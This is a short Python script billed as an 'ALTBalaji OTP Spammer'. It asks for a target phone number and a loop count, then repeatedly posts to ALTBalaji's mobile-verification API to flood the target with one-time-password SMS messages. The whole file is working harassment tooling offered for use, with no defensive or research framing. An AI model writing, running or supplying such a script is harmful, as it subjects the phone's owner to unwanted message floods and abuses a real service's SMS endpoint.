import os, sys, json, requests, time

class Bala:
	def __init__(self):
		self.u="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN"
		self.unum()

	def unum(self):
		kod=input("your country code (without +): ")
		nom=input(f"your target num: +{kod} ")
		jum=int(input("looping: "))
		for i in range(jum):
			res=self.send(kod,nom)
			if '{"status":"ok"}' in res:
				print(f"{i+1}. Success")
			else:
				print(f"{i+1}. Failed\n- Detail: {res}")

	def send(self,kod,nom):
		ata={"country_code":kod,"phone_number":nom}
		req=requests.post(self.u,data=json.dumps(ata))
		return req.text

try:
	os.system('clear')
	print("""
	# ALTBalaji OTP Spammer #
	    ~ By Kang-newbie ~
	""")
	Bala()
	pil=input("\ntry again (y/n)?")
	if pil.lower == "y":
		Bala()
	else:
		sys.exit("Bye Bye :*")
except Exception as Err:
	print(f"Err: {Err}")
